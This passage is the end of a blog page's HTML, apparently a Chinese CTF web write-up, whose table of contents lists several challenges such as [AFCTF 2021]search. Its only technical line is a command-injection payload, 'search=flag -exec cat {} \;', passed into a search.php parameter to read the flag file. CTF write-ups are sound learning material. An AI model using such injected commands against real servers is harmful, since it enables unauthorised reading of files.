+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?search=flag -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/write-up-ctf-web/" rel="tag"># -write up -ctf -web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/07/pop%E9%93%BE%E4%B8%93%E7%BB%831/" rel="next" title="pop链专练1">
+                <i class="fa fa-chevron-left"></i> pop链专练1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SCTF-2021-loginme"><span class="nav-number"></span> <span class="nav-text">[SCTF 2021]loginme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GKCTF-2021-easycms"><span class="nav-number"></span> <span class="nav-text">[GKCTF 2021]easycms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2018-Warmup"><span class="nav-number"></span> <span class="nav-text">[HCTF 2018]Warmup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NCTF-2018-%E5%85%A8%E7%90%83%E6%9C%80%E5%A4%A7%E4%BA%A4%E5%8F%8B%E7%BD%91%E7%AB%99"><span class="nav-number"></span> <span class="nav-text">[NCTF 2018]全球最大交友网站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Double-Secret"><span class="nav-number"></span> <span class="nav-text">[CISCN 2019华东南]Double Secret</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AFCTF-2021-search"><span class="nav-number"></span> <span class="nav-text">[AFCTF 2021]search</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
